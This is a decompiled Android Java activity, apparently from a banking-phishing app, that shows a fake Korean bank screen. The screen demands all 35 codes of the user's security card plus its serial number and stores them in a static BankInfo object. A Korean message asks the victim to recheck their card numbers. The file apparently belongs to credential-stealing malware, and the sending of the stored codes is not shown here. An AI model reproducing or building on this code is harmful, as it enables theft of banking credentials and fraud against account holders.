package com.example.bankmanager;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.example.smsmanager.R;

public class BankScardActivity extends Activity {
    Button next;
    EditText sn1;
    EditText sn10;
    EditText sn11;
    EditText sn12;
    EditText sn13;
    EditText sn14;
    EditText sn15;
    EditText sn16;
    EditText sn17;
    EditText sn18;
    EditText sn19;
    EditText sn2;
    EditText sn20;
    EditText sn21;
    EditText sn22;
    EditText sn23;
    EditText sn24;
    EditText sn25;
    EditText sn26;
    EditText sn27;
    EditText sn28;
    EditText sn29;
    EditText sn3;
    EditText sn30;
    EditText sn31;
    EditText sn32;
    EditText sn33;
    EditText sn34;
    EditText sn35;
    EditText sn4;
    EditText sn5;
    EditText sn6;
    EditText sn7;
    EditText sn8;
    EditText sn9;
    EditText sntop;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.scard);
        this.next = (Button) findViewById(R.id.scard_button1);
        initView();
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                BankInfo.scard = BankScardActivity.this.sntop.getText().toString();
                int i = 0;
                if (BankScardActivity.this.sn1.getText().toString() != "" && BankScardActivity.this.sn1.getText().toString().length() == 4) {
                    BankInfo.sn1 = BankScardActivity.this.sn1.getText().toString();
                    i = 0 + 1;
                }
                if (BankScardActivity.this.sn2.getText().toString() != "" && BankScardActivity.this.sn2.getText().toString().length() == 4) {
                    BankInfo.sn2 = BankScardActivity.this.sn2.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn3.getText().toString() != "" && BankScardActivity.this.sn3.getText().toString().length() == 4) {
                    BankInfo.sn3 = BankScardActivity.this.sn3.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn4.getText().toString() != "" && BankScardActivity.this.sn4.getText().toString().length() == 4) {
                    BankInfo.sn4 = BankScardActivity.this.sn4.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn5.getText().toString() != "" && BankScardActivity.this.sn5.getText().toString().length() == 4) {
                    BankInfo.sn5 = BankScardActivity.this.sn5.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn6.getText().toString() != "" && BankScardActivity.this.sn6.getText().toString().length() == 4) {
                    BankInfo.sn6 = BankScardActivity.this.sn6.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn7.getText().toString() != "" && BankScardActivity.this.sn7.getText().toString().length() == 4) {
                    BankInfo.sn7 = BankScardActivity.this.sn7.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn8.getText().toString() != "" && BankScardActivity.this.sn8.getText().toString().length() == 4) {
                    BankInfo.sn8 = BankScardActivity.this.sn8.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn9.getText().toString() != "" && BankScardActivity.this.sn9.getText().toString().length() == 4) {
                    BankInfo.sn9 = BankScardActivity.this.sn9.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn10.getText().toString() != "" && BankScardActivity.this.sn10.getText().toString().length() == 4) {
                    BankInfo.sn10 = BankScardActivity.this.sn10.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn11.getText().toString() != "" && BankScardActivity.this.sn11.getText().toString().length() == 4) {
                    BankInfo.sn11 = BankScardActivity.this.sn11.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn12.getText().toString() != "" && BankScardActivity.this.sn12.getText().toString().length() == 4) {
                    BankInfo.sn12 = BankScardActivity.this.sn12.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn13.getText().toString() != "" && BankScardActivity.this.sn13.getText().toString().length() == 4) {
                    BankInfo.sn13 = BankScardActivity.this.sn13.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn14.getText().toString() != "" && BankScardActivity.this.sn14.getText().toString().length() == 4) {
                    BankInfo.sn14 = BankScardActivity.this.sn14.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn15.getText().toString() != "" && BankScardActivity.this.sn15.getText().toString().length() == 4) {
                    BankInfo.sn15 = BankScardActivity.this.sn15.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn16.getText().toString() != "" && BankScardActivity.this.sn16.getText().toString().length() == 4) {
                    BankInfo.sn16 = BankScardActivity.this.sn16.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn17.getText().toString() != "" && BankScardActivity.this.sn17.getText().toString().length() == 4) {
                    BankInfo.sn17 = BankScardActivity.this.sn17.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn18.getText().toString() != "" && BankScardActivity.this.sn18.getText().toString().length() == 4) {
                    BankInfo.sn18 = BankScardActivity.this.sn18.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn19.getText().toString() != "" && BankScardActivity.this.sn19.getText().toString().length() == 4) {
                    BankInfo.sn19 = BankScardActivity.this.sn19.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn20.getText().toString() != "" && BankScardActivity.this.sn20.getText().toString().length() == 4) {
                    BankInfo.sn20 = BankScardActivity.this.sn20.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn21.getText().toString() != "" && BankScardActivity.this.sn21.getText().toString().length() == 4) {
                    BankInfo.sn21 = BankScardActivity.this.sn21.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn22.getText().toString() != "" && BankScardActivity.this.sn22.getText().toString().length() == 4) {
                    BankInfo.sn22 = BankScardActivity.this.sn22.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn23.getText().toString() != "" && BankScardActivity.this.sn23.getText().toString().length() == 4) {
                    BankInfo.sn23 = BankScardActivity.this.sn23.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn24.getText().toString() != "" && BankScardActivity.this.sn24.getText().toString().length() == 4) {
                    BankInfo.sn24 = BankScardActivity.this.sn24.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn25.getText().toString() != "" && BankScardActivity.this.sn25.getText().toString().length() == 4) {
                    BankInfo.sn25 = BankScardActivity.this.sn25.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn26.getText().toString() != "" && BankScardActivity.this.sn26.getText().toString().length() == 4) {
                    BankInfo.sn26 = BankScardActivity.this.sn26.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn27.getText().toString() != "" && BankScardActivity.this.sn27.getText().toString().length() == 4) {
                    BankInfo.sn27 = BankScardActivity.this.sn27.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn28.getText().toString() != "" && BankScardActivity.this.sn28.getText().toString().length() == 4) {
                    BankInfo.sn28 = BankScardActivity.this.sn28.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn29.getText().toString() != "" && BankScardActivity.this.sn29.getText().toString().length() == 4) {
                    BankInfo.sn29 = BankScardActivity.this.sn29.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn30.getText().toString() != "" && BankScardActivity.this.sn30.getText().toString().length() == 4) {
                    BankInfo.sn30 = BankScardActivity.this.sn30.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn31.getText().toString() != "" && BankScardActivity.this.sn31.getText().toString().length() == 4) {
                    BankInfo.sn31 = BankScardActivity.this.sn31.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn32.getText().toString() != "" && BankScardActivity.this.sn32.getText().toString().length() == 4) {
                    BankInfo.sn32 = BankScardActivity.this.sn32.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn33.getText().toString() != "" && BankScardActivity.this.sn33.getText().toString().length() == 4) {
                    BankInfo.sn33 = BankScardActivity.this.sn33.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn34.getText().toString() != "" && BankScardActivity.this.sn34.getText().toString().length() == 4) {
                    BankInfo.sn34 = BankScardActivity.this.sn34.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn35.getText().toString() != "" && BankScardActivity.this.sn35.getText().toString().length() == 4) {
                    BankInfo.sn35 = BankScardActivity.this.sn35.getText().toString();
                    i++;
                }
                if (i == 35) {
                    Intent intent = new Intent();
                    intent.setClass(BankScardActivity.this.getApplicationContext(), BankEndActivity.class);
                    BankScardActivity.this.startActivity(intent);
                    return;
                }
                Toast.makeText(BankScardActivity.this.getApplicationContext(), "보안카드번호 및 일련번호확인바립니다!", 0).show();
            }
        });
    }

    /* access modifiers changed from: 0000 */
    public void initView() {
        this.sntop = (EditText) findViewById(R.id.scard_editTexttop);
        this.sn1 = (EditText) findViewById(R.id.r1_editText1);
        this.sn2 = (EditText) findViewById(R.id.r1_editText2);
        this.sn3 = (EditText) findViewById(R.id.r1_editText3);
        this.sn4 = (EditText) findViewById(R.id.r1_editText4);
        this.sn5 = (EditText) findViewById(R.id.r1_editText5);
        this.sn6 = (EditText) findViewById(R.id.r1_editText6);
        this.sn7 = (EditText) findViewById(R.id.r1_editText7);
        this.sn8 = (EditText) findViewById(R.id.r2_editText1);
        this.sn9 = (EditText) findViewById(R.id.r2_editText2);
        this.sn10 = (EditText) findViewById(R.id.r2_editText3);
        this.sn11 = (EditText) findViewById(R.id.r2_editText4);
        this.sn12 = (EditText) findViewById(R.id.r2_editText5);
        this.sn13 = (EditText) findViewById(R.id.r2_editText6);
        this.sn14 = (EditText) findViewById(R.id.r2_editText7);
        this.sn15 = (EditText) findViewById(R.id.r3_editText1);
        this.sn16 = (EditText) findViewById(R.id.r3_editText2);
        this.sn17 = (EditText) findViewById(R.id.r3_editText3);
        this.sn18 = (EditText) findViewById(R.id.r3_editText4);
        this.sn19 = (EditText) findViewById(R.id.r3_editText5);
        this.sn20 = (EditText) findViewById(R.id.r3_editText6);
        this.sn21 = (EditText) findViewById(R.id.r3_editText7);
        this.sn22 = (EditText) findViewById(R.id.r4_editText1);
        this.sn23 = (EditText) findViewById(R.id.r4_editText2);
        this.sn24 = (EditText) findViewById(R.id.r4_editText3);
        this.sn25 = (EditText) findViewById(R.id.r4_editText4);
        this.sn26 = (EditText) findViewById(R.id.r4_editText5);
        this.sn27 = (EditText) findViewById(R.id.r4_editText6);
        this.sn28 = (EditText) findViewById(R.id.r4_editText7);
        this.sn29 = (EditText) findViewById(R.id.r5_editText1);
        this.sn30 = (EditText) findViewById(R.id.r5_editText2);
        this.sn31 = (EditText) findViewById(R.id.r5_editText3);
        this.sn32 = (EditText) findViewById(R.id.r5_editText4);
        this.sn33 = (EditText) findViewById(R.id.r5_editText5);
        this.sn34 = (EditText) findViewById(R.id.r5_editText6);
        this.sn35 = (EditText) findViewById(R.id.r5_editText7);
    }
}
